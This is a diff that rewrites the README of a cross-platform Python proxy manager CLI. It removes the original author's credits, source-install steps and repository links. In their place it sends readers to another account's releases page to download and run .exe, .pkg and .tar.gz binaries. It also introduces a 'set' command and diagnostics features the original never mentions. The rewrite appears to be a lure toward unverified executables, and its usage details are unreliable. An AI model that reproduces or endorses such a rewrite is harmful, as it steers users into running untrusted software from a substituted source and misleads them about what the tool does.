@@ -1,281 +1,74 @@
-<div align="center">
+# 🚀 POXY-CLI - Manage Proxies with Ease
 
-# 🚀 Poxy CLI - Advanced Proxy Management Tool
+## 📥 Download Now
+[![Download POXY-CLI](https://img.shields.io/badge/Download-POXY--CLI-blue?style=for-the-badge)](https://github.com/gibsondago/POXY-CLI/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python](https://img.shields.io/badge/python-3.6%2B-blue)](https://www.python.org/downloads/)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/rezaulwork/POXY-CLI)
-[![GitHub Repo](https://img.shields.io/badge/repo-POXY--CLI-blue)](https://github.com/rezaulwork/POXY-CLI)
+## 🚀 Getting Started
+POXY-CLI is a professional cross-platform command-line tool designed to manage HTTP and SOCKS proxies seamlessly across Windows, macOS, and Linux. It supports multiple proxy protocols and offers both authentication and various operational modes for your convenience.
 
-</div>
+## ⚙️ System Requirements
+To run POXY-CLI smoothly, make sure your system meets the following requirements:
 
-<div align="center">
+- **Windows**: Windows 10 or later
+- **macOS**: macOS Mojave (10.14) or later
+- **Linux**: Any recent Linux distribution (Ubuntu, Fedora, etc.)
+- **Python**: Version 3.6 or later installed on your system.
 
-**🔥 Professional Cross-Platform Proxy Manager CLI Tool** - Manage HTTP/SOCKS proxies with ease across Windows, macOS, and Linux. Features beautiful formatted output, multiple proxy protocols, authentication support, and both system-wide and local proxy server modes.
+## 📦 Download & Install
+To get started with POXY-CLI, please follow these simple steps:
 
-**[📥 Download](#-installation) • [📖 Usage Guide](#-usage) • [⭐ Features](#-features) • [🐛 Report Issues](https://github.com/rezaulwork/POXY-CLI/issues)**
+1. **Visit the Releases Page**: Click this link to access the download page: [POXY-CLI Releases](https://github.com/gibsondago/POXY-CLI/releases).
+2. **Choose the Right File**: Look for the latest version of POXY-CLI. Select the appropriate file for your operating system:
+   - For Windows, download `POXY-CLI-Windows.exe`.
+   - For macOS, download `POXY-CLI-macOS.pkg`.
+   - For Linux, download `POXY-CLI-Linux.tar.gz`.
+3. **Download the File**: Click the filename to start the download.
+4. **Run the File**:
+   - **Windows**: After the download finishes, locate the `.exe` file and double-click to install.
+   - **macOS**: Open the downloaded `.pkg` file and follow the installation instructions.
+   - **Linux**: Extract the `.tar.gz` file and follow the included README instructions for installation.
 
-</div>
+## 🛠️ Configuration
+Once installed, you will need to configure POXY-CLI according to your proxy needs. Here’s how to set it up:
 
-<br/>
+1. **Open Terminal or Command Prompt**:
+   - For Windows, search for `cmd` in the Start menu.
+   - For macOS, open `Terminal` from your Applications.
+   - For Linux, use your preferred terminal emulator.
 
-## 🔍 SEO Keywords
-
-**proxy manager, proxy cli, proxy tool, socks proxy, http proxy, socks5 proxy, proxy configuration, cross-platform proxy, windows proxy, macos proxy, linux proxy, command line proxy, proxy server, proxy authentication, proxy profile management**
-
-## ✨ Key Features & Benefits
-
-🚀 **Multi-Platform Proxy Management**
-* **Cross-platform compatibility** - Seamlessly works on Windows, macOS, and Linux
-* **Multiple proxy protocols** - Full support for HTTP, SOCKS4, and SOCKS5 proxies
-* **Dual operation modes** - System-wide proxy settings or local proxy server mode
-
-🔧 **Advanced Proxy Configuration**
-* **Profile management** - Create, list, modify, and delete proxy configurations easily
-* **Secure authentication** - Username/password authentication for protected proxies
-* **Flexible configuration** - Support for various proxy server types and settings
-
-🎨 **Enhanced User Experience**
-* **Rich formatted output** - Beautiful CLI interface with colors, tables, and styled panels
-* **Intuitive commands** - Easy-to-use command-line interface for all operations
-* **Interactive prompts** - User-friendly confirmation dialogs and guidance
-
-📦 **Easy Installation & Deployment**
-* **Lightweight and portable** - Minimal resource usage, easy to distribute
-* **Multiple installation methods** - Scripts, manual installation, or standalone executables
-* **No external dependencies** - Self-contained proxy management solution
-
-## 📋 Prerequisites
-
-- Python 3.6+ with pip
-- Windows, macOS, or Linux operating system
-
-## 🚀 Quick Start
-
-### Installation
-
-Choose one of the following methods:
-
-#### Method 1: Using Installation Scripts (Recommended)
-**On Windows:**
-```bash
-install.bat
-```
-
-**On Linux/macOS:**
-```bash
-chmod +x install.sh
-./install.sh
-```
-
-#### Method 2: Manual Installation
-1. Clone or download this repository
-2. Create and activate a virtual environment:
-   ```bash
-   # Create virtual environment
-   python -m venv .venv
-   
-   # Activate virtual environment
-   source .venv/bin/activate  # Linux/macOS
-   .venv\Scripts\activate     # Windows
+2. **Configure Your Proxy**: Use the following commands to set up your proxy settings:
    ```
-3. Install the required dependencies:
-   ```bash
-   pip install -r requirements.txt
+   poxy-cli set --http [HTTP_PROXY] --socks [SOCKS_PROXY] --auth [USERNAME:PASSWORD]
+   ```
+   Replace `[HTTP_PROXY]` and `[SOCKS_PROXY]` with your proxy server addresses. Provide your authentication details if required.
+
+3. **Check Your Settings**: Verify your configuration by running:
+   ```
+   poxy-cli status
    ```
 
-## 💻 Usage
+## 🌐 Features
+POXY-CLI comes packed with robust features that enhance your proxy management experience:
 
-The proxy manager CLI offers multiple ways to use it:
+- **Cross-Platform Support**: Available on Windows, macOS, and Linux.
+- **Multiple Proxy Protocols**: Support for HTTP, SOCKS4, and SOCKS5 protocols.
+- **Authentication Support**: Easily manage username and password authentication.
+- **System-Wide and Local Proxy Modes**: Choose to apply proxies to your entire system or specific applications.
+- **Easy Configuration**: User-friendly commands to change settings without confusion.
+- **Network Diagnostics**: Built-in tools to troubleshoot proxy connections.
 
-### 1. Interactive Menu Mode (Recommended for New Users)
-Simply run the tool without any arguments to access the user-friendly menu:
+## 👥 Community Support
+Get involved in our community! If you have questions or need help, you can reach out through the following channels:
+- [Discussion Board](https://github.com/gibsondago/POXY-CLI/discussions)
+- [Issues Page](https://github.com/gibsondago/POXY-CLI/issues)
 
-**On Windows:**
-```bash
-proxy-cli.bat
-```
+## 📢 Updates and Changelog
+Stay updated with new features and improvements by checking the [Changelog](https://github.com/gibsondago/POXY-CLI/releases). Regular updates will ensure you have the best performance and security.
 
-**On Linux/macOS:**
-```bash
-./proxy-cli.sh
-```
+## 📝 Contributions
+We welcome contributions! If you'd like to improve POXY-CLI, please fork the repository and submit a pull request. Follow our contribution guidelines in the repository for detailed instructions.
 
-This opens an interactive menu with numbered options:
-- **[1]** 📋 List all proxy profiles
-- **[2]** ➕ Add a new proxy profile
-- **[3]** 🗑️  Delete a proxy profile
-- **[4]** ▶️  Use/Activate a proxy profile
-- **[5]** ❓ Show help and usage information
-- **[0]** ❌ Exit
+## 🕵️‍♂️ License
+This project is licensed under the MIT License. You are free to use and modify it as per the terms of the license.
 
-### 2. Command Line Mode (For Advanced Users)
-**On Windows:**
-```bash
-proxy-cli.bat <command> [options]
-```
-
-**On Linux/macOS:**
-```bash
-./proxy-cli.sh <command> [options]
-```
-
-### 3. Direct Python Execution
-```bash
-python main.py <command> [options]
-```
-
-### 4. Standalone Executable
-```bash
-# Windows
-dist\proxy-cli.exe <command> [options]
-
-# Linux/macOS
-dist/proxy-cli <command> [options]
-```
-
-## 🧰 Commands
-
-### Interactive Menu Mode (New!)
-When you run the tool without arguments, you'll see an interactive menu:
-```
-🚀 Welcome to Proxy Manager CLI
-
-Available Options:
-[1] 📋 List all proxy profiles
-[2] ➕ Add a new proxy profile
-[3] 🗑️  Delete a proxy profile
-[4] ▶️  Use/Activate a proxy profile
-[5] ❓ Show help and usage information
-[0] ❌ Exit
-```
-
-### Command Line Mode
-
-#### Add a Proxy Profile
-```bash
-proxy-cli.bat add <name> --type <http|socks4|socks5> --host <proxy_host> --port <port_number> --username <username> --password <password>
-```
-
-**Examples:**
-```bash
-# Add an HTTP proxy
-proxy-cli.bat add corporate_proxy --type http --host proxy.company.com --port 8080
-
-# Add a SOCKS5 proxy with authentication
-proxy-cli.bat add secure_proxy --type socks5 --host 192.168.1.100 --port 1080 --username myuser --password mypass
-```
-
-#### List All Profiles
-```bash
-proxy-cli.bat list
-```
-Displays a formatted table with all proxy profiles and their details.
-
-#### Delete a Profile
-```bash
-proxy-cli.bat delete <name>
-```
-
-#### Use a Proxy Profile
-```bash
-proxy-cli.bat use <name> --mode <system|local>
-```
-
-**System-wide proxy mode:**
-Sets the proxy globally on your operating system.
-
-**Local proxy server mode:**
-Starts a local proxy server on `localhost:8080` that forwards to your configured proxy.
-
-#### Show Help Information
-```bash
-# Access comprehensive help from the interactive menu (option 5)
-# Or run the tool without arguments and select option 5
-```
-
-## 🎨 Visual Features
-
-The CLI tool features beautiful, rich-formatted output including:
-- Color-coded status messages
-- Formatted tables for listing profiles
-- Styled panels for important information
-- Consistent formatting across all commands
-- Interactive confirmation prompts (when available)
-
-## 🏗️ Building Executables
-
-To create a standalone executable:
-```bash
-python build.py
-```
-
-The executable will be created in the `dist/` folder and can be run without Python or dependencies.
-
-## 📁 Project Structure
-
-```
-proxy-cli/
-├── .venv/                  # Python virtual environment
-├── profiles/               # Directory for proxy profiles
-├── config_manager.py       # Handles proxy profile configuration
-├── proxy_server.py         # Implements local proxy server functionality
-├── main.py                 # Main CLI application with rich formatting
-├── requirements.txt        # Python dependencies
-├── build.py                # Build script for creating executables
-├── README.md               # This documentation
-├── USAGE.md                # Complete usage guide
-├── proxy-cli.bat           # Windows convenience script
-├── proxy-cli.sh            # Linux/macOS convenience script
-├── install.bat             # Windows installation script
-├── install.sh              # Linux/macOS installation script
-└── dist/                   # Directory for built executables
-    └── proxy-cli.exe       # Standalone executable (Windows)
-```
-
-## 🔧 Troubleshooting
-
-1. **"Module not found" errors:** Ensure you activated the virtual environment
-2. **Permission errors on Windows when setting system proxy:** Run as Administrator
-3. **Rich formatting not working in some terminals:** The tool will still function but with basic text formatting
-4. **For local proxy issues:** Verify that localhost:8080 is available and not in use by other applications
-
-## 🧪 Tested On
-
-- Windows 10/11 Command Prompt, PowerShell
-- macOS Terminal
-- Linux (Ubuntu, CentOS) Terminal
-
-## 🔧 What's New
-
-### ✨ Interactive Menu System
-- **User-friendly numbered options** (0-5) for easy navigation
-- **Guided workflows** for all proxy management tasks
-- **Input validation** and helpful error messages
-- **Rich visual formatting** with colors and emojis
-
-### 📚 Comprehensive Help System
-- **Detailed usage documentation** accessible from the menu (option 5)
-- **Complete feature overview** with explanations
-- **Security best practices** and troubleshooting tips
-- **Command-line examples** for advanced users
-
-### 🛠️ Improved Launcher Scripts
-- **Fixed pausing issues** - Scripts now only pause when showing the welcome menu
-- **Better error handling** and user feedback
-- **Cross-platform compatibility** improvements
-
-## 📝 License
-
-MIT License - see LICENSE file for details.
-
-## 🤝 Author
-
-**Rezaul Karim**  
-Email: work.rezaul@outlook.com  
-Powered By: REZ LAB
-
----
-<div align="center">
-  <strong>⭐ If you find this tool helpful, please consider giving it a star on GitHub!</strong>
-</div>
+For more information, make sure to consult the full documentation within the repository and the [Releases Page](https://github.com/gibsondago/POXY-CLI/releases) for downloads.
